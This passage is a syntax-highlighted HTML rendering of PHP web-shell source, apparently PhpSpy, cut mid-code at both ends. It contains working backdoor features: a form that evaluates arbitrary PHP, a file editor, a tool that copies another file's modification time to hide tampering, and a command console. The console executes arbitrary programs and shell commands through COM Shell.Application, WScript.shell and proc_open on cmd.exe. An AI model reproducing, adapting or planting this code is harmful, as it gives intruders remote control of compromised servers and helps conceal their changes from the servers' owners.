<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">maketext(array(</span><span style="color: #70c0b1;">'title'</span>=&gt;<span style="color: #70c0b1;">'PHP Code'</span>,<span style="color: #70c0b1;">'name'</span>=&gt;<span style="color: #70c0b1;">'phpcode'</span>, <span style="color: #70c0b1;">'value'</span>=&gt;$<span style="color: #e7c547;">phpcode</span>));
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;p&gt;&lt;a href="http://w'</span>.<span style="color: #70c0b1;">'ww.4ng'</span>.<span style="color: #70c0b1;">'el.net/php'</span>.<span style="color: #70c0b1;">'spy/pl'</span>.<span style="color: #70c0b1;">'ugin/" target="_bla</span><span style="color: #70c0b1; text-decoration: underline;">nk"&gt;Get plugins&lt;/a&gt;&lt;/p&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">formfooter(</span>);
}<span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">end eval</span>

<span style="color: #b9ca4a;">elseif</span> ($<span style="color: #e7c547;">action</span> == <span style="color: #70c0b1;">'editfile'</span>) {
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>(<span style="color: #eaeaea; background-color: #000000;">file_exists(</span>$<span style="color: #e7c547;">opfile</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">fp</span>=@<span style="color: #eaeaea; background-color: #000000;">fopen(</span>$<span style="color: #e7c547;">opfile</span>,<span style="color: #70c0b1;">'r'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">contents</span>=@<span style="color: #eaeaea; background-color: #000000;">fread(</span>$<span style="color: #e7c547;">fp</span>, <span style="color: #eaeaea; background-color: #000000;">filesize(</span>$<span style="color: #e7c547;">opfile</span>));
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   @<span style="color: #eaeaea; background-color: #000000;">fclose(</span>$<span style="color: #e7c547;">fp</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">contents</span>=<span style="color: #eaeaea; background-color: #000000;">htmlspecialchars(</span>$<span style="color: #e7c547;">contents</span>);
<span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">formhead(array(</span><span style="color: #70c0b1;">'title'</span>=&gt;<span style="color: #70c0b1;">'Create / Edit File'</span>));
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'action'</span>,<span style="color: #70c0b1;">'file'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'dir'</span>,$<span style="color: #e7c547;">nowpath</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makeinput(array(</span><span style="color: #70c0b1;">'title'</span>=&gt;<span style="color: #70c0b1;">'Current File (import new file name and new file)'</span>,<span style="color: #70c0b1; text-decoration: underline;">'name'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #70c0b1; text-decoration: underline;">'editfilename'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'value'</span><span style="text-decoration: underline;">=&gt;$</span><span style="color: #e7c547; text-decoration: underline;">opfile</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'newline'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">1</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">maketext(array(</span><span style="color: #70c0b1;">'title'</span>=&gt;<span style="color: #70c0b1;">'File Content'</span>,<span style="color: #70c0b1;">'name'</span>=&gt;<span style="color: #70c0b1;">'filecontent'</span>,<span style="color: #70c0b1;">'value'</span>=&gt;$<span style="color: #e7c547;">conte</span><span style="color: #e7c547; text-decoration: underline;">nts</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">formfooter(</span>);

<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">goback(</span>);

}<span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">end editfile</span>

<span style="color: #b9ca4a;">elseif</span> ($<span style="color: #e7c547;">action</span> == <span style="color: #70c0b1;">'newtime'</span>) {
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">opfilemtime</span> = @<span style="color: #eaeaea; background-color: #000000;">filemtime(</span>$<span style="color: #e7c547;">opfile</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">$time = strtotime("$year-$month-$day $hour:$minute:$second");</span>
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">cachemonth</span> = <span style="color: #eaeaea; background-color: #000000;">array(</span><span style="color: #70c0b1;">'January'</span>=&gt;<span style="color: #eaeaea; background-color: #000000;">1</span>,<span style="color: #70c0b1;">'February'</span>=&gt;<span style="color: #eaeaea; background-color: #000000;">2</span>,<span style="color: #70c0b1;">'March'</span>=&gt;<span style="color: #eaeaea; background-color: #000000;">3</span>,<span style="color: #70c0b1;">'April'</span>=&gt;<span style="color: #eaeaea; background-color: #000000;">4</span>,<span style="color: #70c0b1;">'May'</span>=&gt;<span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">5</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'June'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">6</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'July'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">7</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'August'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">8</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'September'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">9</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'October'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">10</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'November'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">11</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'December'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">12</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">formhead(array(</span><span style="color: #70c0b1;">'title'</span>=&gt;<span style="color: #70c0b1;">'Clone folder/file was last modified time'</span>));
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'action'</span>,<span style="color: #70c0b1;">'file'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'dir'</span>,$<span style="color: #e7c547;">nowpath</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makeinput(array(</span><span style="color: #70c0b1;">'title'</span>=&gt;<span style="color: #70c0b1;">'Alter folder/file'</span>,<span style="color: #70c0b1;">'name'</span>=&gt;<span style="color: #70c0b1;">'curfile'</span>,<span style="color: #70c0b1;">'value'</span>=&gt;$<span style="color: #e7c547;">opf</span><span style="color: #e7c547; text-decoration: underline;">ile</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'size'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">120</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'newline'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">1</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makeinput(array(</span><span style="color: #70c0b1;">'title'</span>=&gt;<span style="color: #70c0b1;">'Reference folder/file (fullpath)'</span>,<span style="color: #70c0b1;">'name'</span>=&gt;<span style="color: #70c0b1;">'tarfile</span><span style="color: #70c0b1; text-decoration: underline;">'</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'size'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">120</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'newline'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">1</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">formfooter(</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">formhead(array(</span><span style="color: #70c0b1;">'title'</span>=&gt;<span style="color: #70c0b1;">'Set last modified'</span>));
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'action'</span>,<span style="color: #70c0b1;">'file'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'dir'</span>,$<span style="color: #e7c547;">nowpath</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makeinput(array(</span><span style="color: #70c0b1;">'title'</span>=&gt;<span style="color: #70c0b1;">'Current folder/file (fullpath)'</span>,<span style="color: #70c0b1;">'name'</span>=&gt;<span style="color: #70c0b1;">'curfile'</span>,<span style="color: #70c0b1; text-decoration: underline;">'value'</span><span style="text-decoration: underline;">=&gt;$</span><span style="color: #e7c547; text-decoration: underline;">opfile</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'size'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">120</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'newline'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">1</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;p&gt;year:'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makeinput(array(</span><span style="color: #70c0b1;">'name'</span>=&gt;<span style="color: #70c0b1;">'year'</span>,<span style="color: #70c0b1;">'value'</span>=&gt;<span style="color: #eaeaea; background-color: #000000;">date(</span><span style="color: #70c0b1;">'Y'</span>,$<span style="color: #e7c547;">opfilemtime</span>),<span style="color: #70c0b1;">'size'</span>=&gt;<span style="color: #eaeaea; background-color: #000000;">4</span>));
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'month:'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makeinput(array(</span><span style="color: #70c0b1;">'name'</span>=&gt;<span style="color: #70c0b1;">'month'</span>,<span style="color: #70c0b1;">'value'</span>=&gt;<span style="color: #eaeaea; background-color: #000000;">date(</span><span style="color: #70c0b1;">'m'</span>,$<span style="color: #e7c547;">opfilemtime</span>),<span style="color: #70c0b1;">'size'</span>=&gt;<span style="color: #eaeaea; background-color: #000000;">2</span>));
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'day:'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makeinput(array(</span><span style="color: #70c0b1;">'name'</span>=&gt;<span style="color: #70c0b1;">'day'</span>,<span style="color: #70c0b1;">'value'</span>=&gt;<span style="color: #eaeaea; background-color: #000000;">date(</span><span style="color: #70c0b1;">'d'</span>,$<span style="color: #e7c547;">opfilemtime</span>),<span style="color: #70c0b1;">'size'</span>=&gt;<span style="color: #eaeaea; background-color: #000000;">2</span>));
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'hour:'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makeinput(array(</span><span style="color: #70c0b1;">'name'</span>=&gt;<span style="color: #70c0b1;">'hour'</span>,<span style="color: #70c0b1;">'value'</span>=&gt;<span style="color: #eaeaea; background-color: #000000;">date(</span><span style="color: #70c0b1;">'H'</span>,$<span style="color: #e7c547;">opfilemtime</span>),<span style="color: #70c0b1;">'size'</span>=&gt;<span style="color: #eaeaea; background-color: #000000;">2</span>));
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'minute:'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makeinput(array(</span><span style="color: #70c0b1;">'name'</span>=&gt;<span style="color: #70c0b1;">'minute'</span>,<span style="color: #70c0b1;">'value'</span>=&gt;<span style="color: #eaeaea; background-color: #000000;">date(</span><span style="color: #70c0b1;">'i'</span>,$<span style="color: #e7c547;">opfilemtime</span>),<span style="color: #70c0b1;">'size'</span>=&gt;<span style="color: #eaeaea; background-color: #000000;">2</span>))<span style="text-decoration: underline;">;</span>
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'second:'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makeinput(array(</span><span style="color: #70c0b1;">'name'</span>=&gt;<span style="color: #70c0b1;">'second'</span>,<span style="color: #70c0b1;">'value'</span>=&gt;<span style="color: #eaeaea; background-color: #000000;">date(</span><span style="color: #70c0b1;">'s'</span>,$<span style="color: #e7c547;">opfilemtime</span>),<span style="color: #70c0b1;">'size'</span>=&gt;<span style="color: #eaeaea; background-color: #000000;">2</span>))<span style="text-decoration: underline;">;</span>
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;/p&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">formfooter(</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">goback(</span>);
}<span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">end newtime</span>

<span style="color: #b9ca4a;">elseif</span> ($<span style="color: #e7c547;">action</span> == <span style="color: #70c0b1;">'shell'</span>) {
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (<span style="color: #d54e53; font-weight: bold;">IS_WIN</span> &amp;&amp; <span style="color: #d54e53; font-weight: bold;">IS_COM</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span>($<span style="color: #e7c547;">program</span> &amp;&amp; $<span style="color: #e7c547;">parameter</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">shell</span>= <span style="color: #b9ca4a;">new</span> <span style="color: #7aa6da;">COM</span>(<span style="color: #70c0b1;">'Shell.Application'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">a</span> = $<span style="color: #e7c547;">shell</span>-&gt;<span style="color: #eaeaea; background-color: #000000;">ShellExecute</span>($<span style="color: #e7c547;">program</span>,$<span style="color: #e7c547;">parameter</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">m(</span><span style="color: #70c0b1;">'Program run has '</span>.(!$<span style="color: #e7c547;">a</span> ? <span style="color: #70c0b1;">'success'</span> : <span style="color: #70c0b1;">'fail'</span>));
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   !$<span style="color: #e7c547;">program</span> &amp;&amp; $<span style="color: #e7c547;">program</span> = <span style="color: #70c0b1;">'c:\windows\system32\cmd.exe'</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   !$<span style="color: #e7c547;">parameter</span> &amp;&amp; $<span style="color: #e7c547;">parameter</span> = <span style="color: #70c0b1;">'/c net start &gt; '</span>.<span style="color: #d54e53; font-weight: bold;">SA_ROOT</span>.<span style="color: #70c0b1;">'log.txt'</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">formhead(array(</span><span style="color: #70c0b1;">'title'</span>=&gt;<span style="color: #70c0b1;">'Execute Program'</span>));
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'action'</span>,<span style="color: #70c0b1;">'shell'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makeinput(array(</span><span style="color: #70c0b1;">'title'</span>=&gt;<span style="color: #70c0b1;">'Program'</span>,<span style="color: #70c0b1;">'name'</span>=&gt;<span style="color: #70c0b1;">'program'</span>,<span style="color: #70c0b1;">'value'</span>=&gt;$<span style="color: #e7c547;">program</span>,<span style="color: #70c0b1;">'</span><span style="color: #70c0b1; text-decoration: underline;">newline'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">1</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;p&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makeinput(array(</span><span style="color: #70c0b1;">'title'</span>=&gt;<span style="color: #70c0b1;">'Parameter'</span>,<span style="color: #70c0b1;">'name'</span>=&gt;<span style="color: #70c0b1;">'parameter'</span>,<span style="color: #70c0b1;">'value'</span>=&gt;$<span style="color: #e7c547;">param</span><span style="color: #e7c547; text-decoration: underline;">eter</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makeinput(array(</span><span style="color: #70c0b1;">'name'</span>=&gt;<span style="color: #70c0b1;">'submit'</span>,<span style="color: #70c0b1;">'class'</span>=&gt;<span style="color: #70c0b1;">'bt'</span>,<span style="color: #70c0b1;">'type'</span>=&gt;<span style="color: #70c0b1;">'submit'</span>,<span style="color: #70c0b1;">'value'</span>=<span style="text-decoration: underline;">&gt;</span><span style="color: #70c0b1; text-decoration: underline;">'Execute'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;/p&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">formfoot(</span>);
<span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">formhead(array(</span><span style="color: #70c0b1;">'title'</span>=&gt;<span style="color: #70c0b1;">'Execute Command'</span>));
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'action'</span>,<span style="color: #70c0b1;">'shell'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (<span style="color: #d54e53; font-weight: bold;">IS_WIN</span> &amp;&amp; <span style="color: #d54e53; font-weight: bold;">IS_COM</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">execfuncdb</span> = <span style="color: #eaeaea; background-color: #000000;">array(</span><span style="color: #70c0b1;">'phpfunc'</span>=&gt;<span style="color: #70c0b1;">'phpfunc'</span>,<span style="color: #70c0b1;">'wscript'</span>=&gt;<span style="color: #70c0b1;">'wscript'</span>,<span style="color: #70c0b1;">'proc_open</span><span style="color: #70c0b1; text-decoration: underline;">'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #70c0b1; text-decoration: underline;">'proc_open'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makeselect(array(</span><span style="color: #70c0b1;">'title'</span>=&gt;<span style="color: #70c0b1;">'Use:'</span>,<span style="color: #70c0b1;">'name'</span>=&gt;<span style="color: #70c0b1;">'execfunc'</span>,<span style="color: #70c0b1;">'option'</span>=&gt;$<span style="color: #e7c547;">execfuncd</span><span style="color: #e7c547; text-decoration: underline;">b</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'selected'</span><span style="text-decoration: underline;">=&gt;$</span><span style="color: #e7c547; text-decoration: underline;">execfunc</span><span style="text-decoration: underline;">,</span><span style="color: #70c0b1; text-decoration: underline;">'newline'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">1</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;p&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makeinput(array(</span><span style="color: #70c0b1;">'title'</span>=&gt;<span style="color: #70c0b1;">'Command'</span>,<span style="color: #70c0b1;">'name'</span>=&gt;<span style="color: #70c0b1;">'command'</span>,<span style="color: #70c0b1;">'value'</span>=&gt;<span style="color: #eaeaea; background-color: #000000;">htmlspecialcha</span><span style="color: #eaeaea; background-color: #000000; text-decoration: underline;">rs(</span><span style="text-decoration: underline;">$</span><span style="color: #e7c547; text-decoration: underline;">command</span><span style="text-decoration: underline;">)));</span>
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makeinput(array(</span><span style="color: #70c0b1;">'name'</span>=&gt;<span style="color: #70c0b1;">'submit'</span>,<span style="color: #70c0b1;">'class'</span>=&gt;<span style="color: #70c0b1;">'bt'</span>,<span style="color: #70c0b1;">'type'</span>=&gt;<span style="color: #70c0b1;">'submit'</span>,<span style="color: #70c0b1;">'value'</span>=&gt;<span style="color: #70c0b1;">'Ex</span><span style="color: #70c0b1; text-decoration: underline;">ecute'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;/p&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">formfoot(</span>);

<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">command</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;hr width="100%" noshade /&gt;&lt;pre&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">execfunc</span>==<span style="color: #70c0b1;">'wscript'</span> &amp;&amp; <span style="color: #d54e53; font-weight: bold;">IS_WIN</span> &amp;&amp; <span style="color: #d54e53; font-weight: bold;">IS_COM</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">wsh</span> = <span style="color: #b9ca4a;">new</span> <span style="color: #7aa6da;">COM</span>(<span style="color: #70c0b1;">'WScript.shell'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">exec</span> = $<span style="color: #e7c547;">wsh</span>-&gt;<span style="color: #eaeaea; background-color: #000000;">exec</span>(<span style="color: #70c0b1;">'cmd.exe /c '</span>.$<span style="color: #e7c547;">command</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">stdout</span> = $<span style="color: #e7c547;">exec</span>-&gt;<span style="color: #eaeaea; background-color: #000000;">StdOut</span>();
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">stroutput</span> = $<span style="color: #e7c547;">stdout</span>-&gt;<span style="color: #eaeaea; background-color: #000000;">ReadAll</span>();
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">echo</span> $<span style="color: #e7c547;">stroutput</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">elseif</span> ($<span style="color: #e7c547;">execfunc</span>==<span style="color: #70c0b1;">'proc_open'</span> &amp;&amp; <span style="color: #d54e53; font-weight: bold;">IS_WIN</span> &amp;&amp; <span style="color: #d54e53; font-weight: bold;">IS_COM</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">descriptorspec</span> = <span style="color: #eaeaea; background-color: #000000;">array(</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>  <span style="color: #eaeaea; background-color: #000000;">0</span> =&gt; <span style="color: #eaeaea; background-color: #000000;">array(</span><span style="color: #70c0b1;">'pipe'</span>, <span style="color: #70c0b1;">'r'</span>),
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>  <span style="color: #eaeaea; background-color: #000000;">1</span> =&gt; <span style="color: #eaeaea; background-color: #000000;">array(</span><span style="color: #70c0b1;">'pipe'</span>, <span style="color: #70c0b1;">'w'</span>),
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>  <span style="color: #eaeaea; background-color: #000000;">2</span> =&gt; <span style="color: #eaeaea; background-color: #000000;">array(</span><span style="color: #70c0b1;">'pipe'</span>, <span style="color: #70c0b1;">'w'</span>)
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   );
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">process</span> = <span style="color: #eaeaea; background-color: #000000;">proc_open(</span>$<span style="color: #7aa6da;">_SERVER</span>[<span style="color: #70c0b1;">'COMSPEC'</span>], $<span style="color: #e7c547;">descriptorspec</span>, $<span style="color: #e7c547;">pipes</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (<span style="color: #eaeaea; background-color: #000000;">is_resource(</span>$<span style="color: #e7c547;">process</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">fwrite(</span>$<span style="color: #e7c547;">pipes</span>[<span style="color: #eaeaea; background-color: #000000;">0</span>], $<span style="color: #e7c547;">command</span>.<span style="color: #70c0b1;">"\r\n"</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">fwrite(</span>$<span style="color: #e7c547;">pipes</span>[<span style="color: #eaeaea; background-color: #000000;">0</span>], <span style="color: #70c0b1;">"exit\r\n"</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">fclose(</span>$<span style="color: #e7c547;">pipes</span>[<span style="color: #eaeaea; background-color: #000000;">0</span>]);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">while</span> (!<span style="color: #eaeaea; background-color: #000000;">feof(</span>$<span style="color: #e7c547;">pipes</span>[<span style="color: #eaeaea; background-color: #000000;">1</span>])) {
